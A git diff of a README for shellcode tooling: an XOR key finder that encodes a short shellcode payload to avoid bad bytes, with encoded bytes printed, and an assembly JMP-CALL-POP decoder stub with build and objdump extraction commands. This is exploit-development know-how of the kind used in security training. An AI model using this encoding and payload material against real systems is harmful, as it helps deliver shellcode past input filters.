@@ -31,6 +31,8 @@ uid=1000(xtk)...
 This script helps to avoid specified badbytes by static XOR key encoding. 
 It looks for appropriate XOR key to fit specified badbytes
 
+### Usage
+
 ```bash
 $ python3 xor_key_finder.py
 
@@ -39,23 +41,28 @@ Encoded shellcode:
 \x3c\xfb\x5b\x45\xb6\x22\x6f\x64\x63\x22\x22\x7e\x65\x5e\x59\x52\xfa\xe3\xbd\x36\x02\x08
 0x3c,0xfb,0x5b,0x45,0xb6,0x22,0x6f,0x64,0x63,0x22,0x22,0x7e,0x65,0x5e,0x59,0x52,0xfa,0xe3,0xbd,0x36,0x02,0x08
 3cfb5b45b6226f646322227e655e5952fae3bd360208
-
-Found valid XOR key: 0x10
+...
+Found valid XOR key: 0xaa
 Encoded shellcode:
-\x21\xe6\x46\x58\xab\x3f\x72\x79\x7e\x3f\x3f\x63\x78\x43\x44\x4f\xe7\xfe\xa0\x2b\x1f\x15
-0x21,0xe6,0x46,0x58,0xab,0x3f,0x72,0x79,0x7e,0x3f,0x3f,0x63,0x78,0x43,0x44,0x4f,0xe7,0xfe,0xa0,0x2b,0x1f,0x15
-21e64658ab3f72797e3f3f637843444fe7fea02b1f15
-
-Found valid XOR key: 0x13
-Encoded shellcode:
-\x22\xe5\x45\x5b\xa8\x3c\x71\x7a\x7d\x3c\x3c\x60\x7b\x40\x47\x4c\xe4\xfd\xa3\x28\x1c\x16
-0x22,0xe5,0x45,0x5b,0xa8,0x3c,0x71,0x7a,0x7d,0x3c,0x3c,0x60,0x7b,0x40,0x47,0x4c,0xe4,0xfd,0xa3,0x28,0x1c,0x16
-22e5455ba83c717a7d3c3c607b40474ce4fda3281c16
-
-Found valid XOR key: 0x16
-Encoded shellcode:
-\x27\xe0\x40\x5e\xad\x39\x74\x7f\x78\x39\x39\x65\x7e\x45\x42\x49\xe1\xf8\xa6\x2d\x19\x13
-0x27,0xe0,0x40,0x5e,0xad,0x39,0x74,0x7f,0x78,0x39,0x39,0x65,0x7e,0x45,0x42,0x49,0xe1,0xf8,0xa6,0x2d,0x19,0x13
-27e0405ead39747f783939657e454249e1f8a62d1913
+\x9b\x5c\xfc\xe2\x11\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xf9\xfe\xf5\x5d\x44\x1a\x91\xa5\xaf
+0x9b,0x5c,0xfc,0xe2,0x11,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xf9,0xfe,0xf5,0x5d,0x44,0x1a,0x91,0xa5,0xaf
+9b5cfce21185c8c3c48585d9c2f9fef55d441a91a5af
 ...
 ```
+
+### ASM XOR payload decoder
+
+This assembly decodes XOR endcoded shellcode and uses JMP-CALL-POP technique to dynamically find the address of the payload in a position-independent manner, ensuring the decoder works regardless of where the code is loaded in memory.
+
+### Usage
+
+```bash
+nasm -f elf64 -o shellcode.o shellcode.asm
+ld -o shellcode shellcode.o
+```
+
+Let's get the RAW payload using:
+```bash
+objdump -d shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+```
+
